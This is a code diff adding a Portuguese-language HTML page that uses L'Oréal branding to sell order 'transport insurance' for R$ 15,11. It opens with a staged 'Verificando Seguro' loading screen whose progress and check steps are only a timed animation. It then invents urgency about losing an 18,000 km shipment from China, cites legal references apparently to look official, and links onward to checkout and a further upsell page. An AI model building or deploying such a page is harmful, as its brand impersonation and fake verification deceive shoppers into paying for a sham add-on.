@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <title>L'Oréal - Proteção do Pedido</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #ffffff; color: #000; }
+
+        /* Loader Ring Customizado */
+        .loader-ring {
+            position: relative;
+            width: 120px;
+            height: 120px;
+        }
+        .loader-ring svg { transform: rotate(-90deg); }
+        .loader-ring circle {
+            fill: none;
+            stroke-width: 4;
+            stroke-linecap: round;
+        }
+        .circle-bg { stroke: #f3f3f3; }
+        .circle-progress {
+            stroke: #000000;
+            stroke-dasharray: 283;
+            stroke-dashoffset: 283;
+            animation: progress-anim 3s ease-in-out forwards;
+        }
+
+        @keyframes progress-anim {
+            to { stroke-dashoffset: 56; } /* 80% */
+        }
+
+        .fade-out { opacity: 0; transition: opacity 0.8s ease-out; pointer-events: none; }
+        .fade-in { opacity: 1 !important; }
+        
+        .step-line {
+            position: absolute;
+            left: 19px;
+            top: 40px;
+            width: 2px;
+            height: calc(100% - 40px);
+            background: #eeeeee;
+        }
+    </style>
+</head>
+<body class="antialiased">
+
+    <div id="loading-screen" class="fixed inset-0 z-50 flex flex-col items-center justify-center bg-white px-6 text-center">
+        <img src="https://logodix.com/logo/1069736.png" alt="L'Oréal" class="w-32 mb-16">
+        
+        <div class="loader-ring mb-8">
+            <svg width="120" height="120">
+                <circle class="circle-bg" cx="60" cy="60" r="45"></circle>
+                <circle class="circle-progress" cx="60" cy="60" r="45"></circle>
+            </svg>
+            <div class="absolute inset-0 flex items-center justify-center">
+                <span class="text-2xl font-bold">80%</span>
+            </div>
+        </div>
+
+        <h1 class="text-xl font-bold mb-2">Verificando Seguro</h1>
+        <p class="text-gray-500 text-sm mb-10 font-light">Analisando rota de transporte do seu pedido</p>
+
+        <div class="w-full max-w-xs bg-gray-50 border border-gray-100 rounded-2xl p-6 space-y-4 text-left shadow-sm">
+            <div class="flex items-center gap-3 text-black text-xs">
+                <i data-lucide="check-circle" class="w-4 h-4"></i>
+                <span class="font-medium">Conectando ao sistema...</span>
+            </div>
+            <div class="flex items-center gap-3 text-black text-xs">
+                <i data-lucide="check-circle" class="w-4 h-4"></i>
+                <span class="font-medium">Verificando rota internacional...</span>
+            </div>
+            <div class="flex items-center gap-3 text-black text-xs">
+                <div class="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin"></div>
+                <span class="font-bold italic">Gerando proposta...</span>
+            </div>
+        </div>
+        
+        <p class="mt-8 text-[10px] text-gray-400 flex items-center gap-2 uppercase tracking-widest">
+            <i data-lucide="lock" class="w-3 h-3"></i> Ambiente seguro L'Oréal Shop
+        </p>
+    </div>
+
+    <main id="main-content" class="max-w-md mx-auto min-h-screen opacity-0 transition-opacity duration-1000 pb-40">
+        
+        <header class="p-6 flex justify-between items-center border-b border-gray-100">
+            <img src="https://logodix.com/logo/1069736.png" alt="L'Oréal" class="h-5">
+            <div class="bg-black text-white text-[10px] font-bold px-3 py-1 rounded-full flex items-center gap-1">
+                <i data-lucide="clock" class="w-3 h-3"></i> 14:22
+            </div>
+        </header>
+
+        <section class="px-6 py-8 space-y-6">
+            <div class="text-center">
+                <div class="inline-flex items-center gap-2 bg-gray-100 px-4 py-1.5 rounded-full text-[11px] mb-4">
+                    <i data-lucide="shield-check" class="w-4 h-4 text-black"></i>
+                    <span class="uppercase tracking-widest font-bold">Seguro de Transporte</span>
+                </div>
+                <h2 class="text-2xl font-black uppercase tracking-tight">Proteja seu Produto</h2>
+                <p class="text-gray-500 text-xs mt-1">Cobertura total durante o trajeto internacional</p>
+            </div>
+
+            <div class="bg-gray-50 border-l-4 border-black p-4 rounded-r-xl flex items-start gap-3">
+                <i data-lucide="alert-circle" class="text-black w-5 h-5 mt-1"></i>
+                <div>
+                    <p class="text-xs font-bold uppercase">Atenção: Risco de Extravio</p>
+                    <p class="text-[11px] text-gray-600">Seu pedido viajará <span class="text-black font-bold">18.000 km</span>. Recomendamos o seguro.</p>
+                </div>
+            </div>
+
+            <div class="bg-white border border-gray-200 rounded-2xl p-6 relative shadow-sm">
+                <h3 class="text-[10px] font-bold uppercase tracking-[0.2em] mb-8 text-gray-400">Rota Logística</h3>
+                
+                <div class="space-y-10 relative">
+                    <div class="flex items-center gap-4 relative z-10">
+                        <div class="w-10 h-10 bg-black rounded-full flex items-center justify-center shadow-lg">
+                            <i data-lucide="box" class="w-5 h-5 text-white"></i>
+                        </div>
+                        <div class="flex-1">
+                            <p class="text-xs font-bold">Centro de Distribuição</p>
+                            <p class="text-[10px] text-gray-400 uppercase">China</p>
+                        </div>
+                        <i data-lucide="check-circle-2" class="w-4 h-4 text-green-500"></i>
+                    </div>
+                    <div class="step-line"></div>
+
+                    <div class="flex items-center gap-4 relative z-10">
+                        <div class="w-10 h-10 bg-white border-2 border-black rounded-full flex items-center justify-center">
+                            <i data-lucide="plane" class="w-5 h-5 text-black"></i>
+                        </div>
+                        <div class="flex-1">
+                            <p class="text-xs font-bold">Transporte Aéreo Internacional</p>
+                            <p class="text-[10px] text-gray-400 uppercase">Em Trânsito - 18.000 km</p>
+                        </div>
+                    </div>
+                    <div class="step-line" style="top: 135px;"></div>
+
+                    <div class="flex items-center gap-4 relative z-10 opacity-30">
+                        <div class="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center text-gray-400">
+                            <i data-lucide="map-pin" class="w-5 h-5"></i>
+                        </div>
+                        <div class="flex-1 text-gray-400">
+                            <p class="text-xs font-bold">Alfândega / Entrega Final</p>
+                            <p class="text-[10px] uppercase">Brasil</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-2 gap-4">
+                <div class="bg-gray-50 border border-gray-100 p-4 rounded-2xl opacity-60">
+                    <i data-lucide="shield-off" class="w-5 h-5 text-gray-400 mb-3"></i>
+                    <p class="text-xs font-bold mb-3">Sem Seguro</p>
+                    <ul class="text-[9px] space-y-2 text-gray-500 font-medium">
+                        <li class="flex items-center gap-1"><i data-lucide="x" class="w-3 h-3"></i> Sem reenvio</li>
+                        <li class="flex items-center gap-1"><i data-lucide="x" class="w-3 h-3"></i> Prejuízo total</li>
+                    </ul>
+                </div>
+
+                <div class="bg-white border-2 border-black p-4 rounded-2xl relative shadow-md">
+                    <div class="absolute -top-2 right-4 bg-black text-white text-[8px] font-black px-2 py-0.5 rounded uppercase tracking-tighter">Recomendado</div>
+                    <i data-lucide="shield-check" class="w-5 h-5 text-black mb-3"></i>
+                    <p class="text-xs font-bold mb-3 italic">Com Seguro</p>
+                    <ul class="text-[9px] space-y-2 text-black font-semibold">
+                        <li class="flex items-center gap-1"><i data-lucide="check" class="w-3 h-3"></i> Reenvio Imediato</li>
+                        <li class="flex items-center gap-1"><i data-lucide="check" class="w-3 h-3"></i> Proteção Global</li>
+                    </ul>
+                </div>
+            </div>
+
+            <p class="text-center text-[9px] text-gray-400 uppercase tracking-tighter">
+                Base Legal: Resolução ANTT nº 5.867/2020 e Código Civil Art. 750
+            </p>
+        </section>
+
+        <footer class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-md bg-white/95 backdrop-blur-md border-t border-gray-100 p-6 space-y-4 shadow-[0_-10px_30px_rgba(0,0,0,0.05)]">
+            <div class="flex justify-between items-center">
+                <span class="text-[11px] text-gray-400 uppercase font-bold tracking-widest">Valor do seguro</span>
+                <span class="text-3xl font-black text-black tracking-tighter">R$ 15,11</span>
+            </div>
+            
+            <button onclick="window.location.href='https://checkout.com'" class="w-full bg-black text-white font-black py-4 rounded-lg text-sm uppercase tracking-[0.2em] transition-all active:scale-95 flex items-center justify-center gap-2 shadow-xl hover:bg-gray-900">
+                Contratar Seguro <i data-lucide="arrow-right" class="w-4 h-4"></i>
+            </button>
+
+            <button onclick="window.location.href='proximoup'" class="w-full text-gray-400 text-[10px] uppercase font-bold tracking-widest hover:text-black transition-colors">
+                Continuar sem seguro
+            </button>
+        </footer>
+    </main>
+
+    <script>
+        lucide.createIcons();
+
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                const loader = document.getElementById('loading-screen');
+                const content = document.getElementById('main-content');
+                
+                loader.classList.add('fade-out');
+                
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                    content.classList.add('fade-in');
+                }, 800);
+            }, 3500); 
+        });
+    </script>
+</body>
+</html>
